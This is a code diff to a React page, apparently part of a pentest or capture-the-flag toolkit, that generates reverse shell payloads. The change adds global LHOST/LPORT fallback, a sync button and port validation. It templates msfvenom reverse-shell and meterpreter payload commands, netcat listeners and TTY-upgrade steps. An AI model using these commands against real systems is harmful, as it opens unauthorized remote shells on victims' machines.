@@ -1,8 +1,9 @@
 "use client";
 
-import { Check, Copy } from "lucide-react";
+import { Check, Copy, Link } from "lucide-react";
 import { useMemo, useState } from "react";
 import toast from "react-hot-toast";
+import { useVariables } from "@/components/VariablesProvider";
 
 type ShellType =
   | "bash"
@@ -46,14 +47,27 @@ function encodeShell(text: string, mode: Encoding): string {
 }
 
 export default function RevShellPage() {
+  const { values } = useVariables();
   const [ip, setIp] = useState("");
   const [port, setPort] = useState("4444");
   const [type, setType] = useState<ShellType>("bash");
   const [encoding, setEncoding] = useState<Encoding>("none");
   const [copied, setCopied] = useState<string>("");
+  const [synced, setSynced] = useState(false);
 
-  const generated = useMemo(() => encodeShell(generate(type, ip, port), encoding), [encoding, ip, port, type]);
-  const listeners = [`nc -lvnp ${port || "LPORT"}`, `rlwrap nc -lvnp ${port || "LPORT"}`];
+  // Effective values — local input wins; if empty, fall back to global variable
+  const effectiveIp = ip || values["LHOST"] || "";
+  const effectivePort = port || values["LPORT"] || "4444";
+
+  const syncFromGlobals = () => {
+    if (values["LHOST"]) setIp(values["LHOST"]);
+    if (values["LPORT"]) setPort(values["LPORT"]);
+    setSynced(true);
+    setTimeout(() => setSynced(false), 2000);
+  };
+
+  const generated = useMemo(() => encodeShell(generate(type, effectiveIp, effectivePort), encoding), [encoding, effectiveIp, effectivePort, type]);
+  const listeners = [`nc -lvnp ${effectivePort || "LPORT"}`, `rlwrap nc -lvnp ${effectivePort || "LPORT"}`];
   const tty = [
     "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
     "Ctrl+Z + stty raw -echo; fg",
@@ -61,12 +75,12 @@ export default function RevShellPage() {
     "stty rows 40 cols 200",
   ];
   const msf = [
-    `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip || "LHOST"} LPORT=${port || "LPORT"} -f elf -o rev.elf`,
-    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip || "LHOST"} LPORT=${port || "LPORT"} -f exe -o rev.exe`,
-    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip || "LHOST"} LPORT=${port || "LPORT"} -f exe -o meter.exe`,
-    `msfvenom -p php/reverse_php LHOST=${ip || "LHOST"} LPORT=${port || "LPORT"} -f raw -o rev.php`,
-    `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${ip || "LHOST"} LPORT=${port || "LPORT"} -f raw -o rev.jsp`,
-    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip || "LHOST"} LPORT=${port || "LPORT"} -f msi -o rev.msi`,
+    `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${effectiveIp || "LHOST"} LPORT=${effectivePort || "LPORT"} -f elf -o rev.elf`,
+    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${effectiveIp || "LHOST"} LPORT=${effectivePort || "LPORT"} -f exe -o rev.exe`,
+    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${effectiveIp || "LHOST"} LPORT=${effectivePort || "LPORT"} -f exe -o meter.exe`,
+    `msfvenom -p php/reverse_php LHOST=${effectiveIp || "LHOST"} LPORT=${effectivePort || "LPORT"} -f raw -o rev.php`,
+    `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${effectiveIp || "LHOST"} LPORT=${effectivePort || "LPORT"} -f raw -o rev.jsp`,
+    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${effectiveIp || "LHOST"} LPORT=${effectivePort || "LPORT"} -f msi -o rev.msi`,
   ];
 
   const copy = async (value: string, key: string) => {
@@ -103,10 +117,55 @@ export default function RevShellPage() {
       <div className="grid gap-6 xl:grid-cols-2">
         <div className="space-y-4">
           <div className="color-panel rounded-md p-4">
-            <h2 className="mb-3 font-mono text-sm text-violet">Connection Details</h2>
+            <div className="mb-3 flex items-center justify-between">
+              <h2 className="font-mono text-sm text-dim">Connection Details</h2>
+              {(values["LHOST"] || values["LPORT"]) && (
+                <button
+                  onClick={syncFromGlobals}
+                  className={`inline-flex items-center gap-1.5 rounded border px-2.5 py-1 font-mono text-[11px] transition-colors ${
+                    synced ? "border-success/60 bg-success/10 text-success" : "border-orange/50 bg-orange/5 text-orange hover:bg-orange/10"
+                  }`}
+                >
+                  <Link size={11} />
+                  {synced ? "Synced!" : "Use global vars"}
+                </button>
+              )}
+            </div>
             <div className="grid gap-3 sm:grid-cols-2">
-              <input value={ip} onChange={(e) => setIp(e.target.value)} placeholder="10.10.14.1" className="rounded border border-violet/40 bg-surface px-3 py-2 text-success outline-none focus:border-core" spellCheck={false} autoComplete="off" />
-              <input value={port} onChange={(e) => setPort(e.target.value)} placeholder="4444" className="rounded border border-violet/40 bg-surface px-3 py-2 text-success outline-none focus:border-core" spellCheck={false} autoComplete="off" />
+              <div className="relative">
+                <input
+                  value={ip}
+                  onChange={(e) => setIp(e.target.value)}
+                  placeholder={values["LHOST"] || "10.10.14.1"}
+                  className={`w-full rounded border bg-surface px-3 py-2 font-mono text-sm text-success outline-none focus:border-orange/60 ${
+                    !ip && values["LHOST"] ? "border-orange/40 placeholder:text-orange/70" : "border-border placeholder:text-dim"
+                  }`}
+                  spellCheck={false}
+                  autoComplete="off"
+                />
+                {!ip && values["LHOST"] && (
+                  <span className="absolute right-2 top-1/2 -translate-y-1/2 font-mono text-[9px] text-orange/60">GLOBAL</span>
+                )}
+              </div>
+              <div className="relative">
+                <input
+                  value={port}
+                  onChange={(e) => {
+                    const v = e.target.value;
+                    if (v === "" || (/^\d+$/.test(v) && +v >= 1 && +v <= 65535)) setPort(v);
+                  }}
+                  placeholder={values["LPORT"] || "4444"}
+                  inputMode="numeric"
+                  className={`w-full rounded border bg-surface px-3 py-2 font-mono text-sm text-success outline-none focus:border-orange/60 ${
+                    !port && values["LPORT"] ? "border-orange/40 placeholder:text-orange/70" : "border-border placeholder:text-dim"
+                  }`}
+                  spellCheck={false}
+                  autoComplete="off"
+                />
+                {!port && values["LPORT"] && (
+                  <span className="absolute right-2 top-1/2 -translate-y-1/2 font-mono text-[9px] text-orange/60">GLOBAL</span>
+                )}
+              </div>
             </div>
           </div>
 
@@ -139,7 +198,7 @@ export default function RevShellPage() {
                 {copied === "generated" ? <Check size={12} /> : <Copy size={12} />} COPY
               </button>
             </div>
-            <pre className="whitespace-pre-wrap break-all font-mono text-sm text-success">{!ip || !port ? "Enter LHOST and LPORT to generate payload..." : generated}</pre>
+            <pre className="whitespace-pre-wrap break-all font-mono text-sm text-success">{!effectiveIp || !effectivePort ? "Enter LHOST and LPORT above, or set them in the PANEL." : generated}</pre>
           </div>
 
           <div className="color-panel rounded-md p-4">
